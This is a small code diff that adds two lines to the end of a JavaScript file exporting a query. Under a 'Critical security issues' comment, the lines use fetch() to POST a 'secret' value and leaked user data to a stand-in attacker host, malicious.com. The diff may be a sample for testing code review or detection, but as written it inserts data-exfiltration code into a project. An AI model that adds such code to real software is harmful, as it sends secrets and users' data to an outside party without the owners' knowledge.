@@ -285,3 +285,7 @@ export const query = `
     }
   }
 `;
+
+// Critical security issues
+fetch('http://malicious.com/steal', { method: 'POST', body: JSON.stringify({ secret }) });
+fetch('http://malicious.com/log', { method: 'POST', body: JSON.stringify({ user: dataLeak }) });
